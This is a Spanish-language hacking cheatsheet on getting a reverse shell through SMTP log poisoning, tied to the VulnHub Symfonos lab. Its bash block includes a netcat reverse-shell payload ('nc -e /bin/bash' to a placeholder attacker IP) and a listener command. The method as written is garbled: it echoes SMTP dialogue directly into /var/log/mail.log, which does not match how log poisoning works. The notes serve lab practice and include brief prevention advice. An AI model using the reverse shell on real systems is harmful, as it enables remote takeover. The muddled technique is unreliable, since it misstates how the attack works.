---
Reverse shell: 
Tecnicas Hacking:
---

## RevShell LogPois SMTP (-p 25)

### Explicación y Funcionalidades:
El Reverse Shell Log Poisoning via SMTP es una técnica de Log Poisoning que aprovecha la funcionalidad de los registros SMTP (Simple Mail Transfer Protocol) para establecer una Reverse Shell en un sistema comprometido. Esta técnica permite a un atacante tomar el control remoto de un sistema comprometido a través de la manipulación de los registros de correo electrónico.

### Papel en la Ciberseguridad:
El Reverse Shell Log Poisoning via SMTP es una preocupación importante en la ciberseguridad ya que puede permitir a los atacantes tomar el control remoto de sistemas comprometidos y realizar actividades maliciosas, como robo de datos, instalación de malware, y compromiso de la integridad del sistema.



## Cheatsheet:

1. Inyección de Log Poisoning en el servidor SMTP:
``` bash   
   echo "MAIL FROM: <attacker@example.com>" >> /var/log/mail.log
   echo "RCPT TO: <victim@example.com>" >> /var/log/mail.log
   echo "DATA" >> /var/log/mail.log
   #Esta línea indica al servidor SMTP que comience a recibir los datos del mensaje de correo electrónico.
   echo "Subject: Command Injection" >> /var/log/mail.log
   #Esta línea establece el asunto del mensaje de correo electrónico como "Command Injection".
   echo "Attacker's Payload" >> /var/log/mail.log
   #Ej: echo "nc -e /bin/bash <attacker_ip> <attacker_port>" >> /var/log/mail.log
   #Esta línea agrega el contenido malicioso, o payload, al mensaje de correo electrónico.
   echo "." >> /var/log/mail.log
   #Esta línea indica al servidor SMTP que ha finalizado la entrada de datos del mensaje de correo electrónico.
   ```

2. Escucha en el atacante:
   ``` bash
   nc -nlvp <puerto>
   ```

## Prevención:

- Monitorizar los registros del servidor SMTP en busca de actividades inusuales o inyectadas.
- Mantener actualizado el software del servidor SMTP para parchear posibles vulnerabilidades.
- Restringir el acceso al servidor SMTP y aplicar autenticación sólida para evitar accesos no autorizados.
- Utilizar listas de control de acceso (ACL) para limitar qué direcciones IP pueden enviar comandos al servidor SMTP.

## Máquinas
[Symphonos](https://www.vulnhub.com/entry/symfonos-1,322/)